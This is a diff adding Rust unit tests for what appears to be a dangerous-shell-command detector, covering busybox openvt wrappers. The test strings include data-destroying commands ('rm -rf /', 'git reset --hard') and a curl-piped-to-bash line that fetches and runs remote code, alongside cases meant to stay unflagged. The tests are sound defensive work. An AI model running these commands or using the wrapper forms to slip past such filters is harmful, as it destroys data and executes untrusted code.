@@ -16399,9 +16399,13 @@ mod tests {
             "openvt -sw git clean -fdx",
             "openvt -l bash -c 'rm -rf /'",
             "env openvt --force -- rm -rf /",
+            "busybox openvt rm -rf /",
+            "busybox openvt -c 3 -- git reset --hard HEAD~1",
             "printf x | xargs openvt rm -rf /",
             "curl https://example.invalid/x | openvt bash",
             "curl https://example.invalid/x | openvt -f -- bash",
+            "curl https://example.invalid/x | busybox openvt bash",
+            "curl https://example.invalid/x | busybox openvt -f -- bash",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -16423,12 +16427,20 @@ mod tests {
             "openvt -c",
             "openvt --console",
             "openvt echo rm -rf /",
+            // busybox action / invalid applet never invents an openvt child.
+            "busybox -- openvt rm -rf /",
+            "busybox --help openvt rm -rf /",
+            "busybox -h openvt systemctl reboot",
+            "busybox openvt --help rm -rf /",
+            "busybox openvt -u rm -rf /",
+            "busybox openvt --user git reset --hard HEAD~1",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
                 "openvt metadata/user/help invented a peel for {command:?}"
             );
         }
+        assert!(is_dangerous("busybox openvt echo hi").is_none());
     }
 
     /// Nested carriers: timeout/nice outside and inside openvt still expose the
@@ -16459,6 +16471,10 @@ mod tests {
         assert!(is_dangerous("timeout 5 openvt --help rm -rf /").is_none());
         assert!(is_dangerous("timeout 5 openvt -u rm -rf /").is_none());
         assert!(is_dangerous("timeout 5 busybox -- openvt rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox openvt --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox openvt -u rm -rf /").is_none());
+        assert!(is_dangerous("nice -n 5 busybox --help openvt rm -rf /").is_none());
+        assert!(is_dangerous("busybox openvt echo hi").is_none());
     }
 
     #[test]
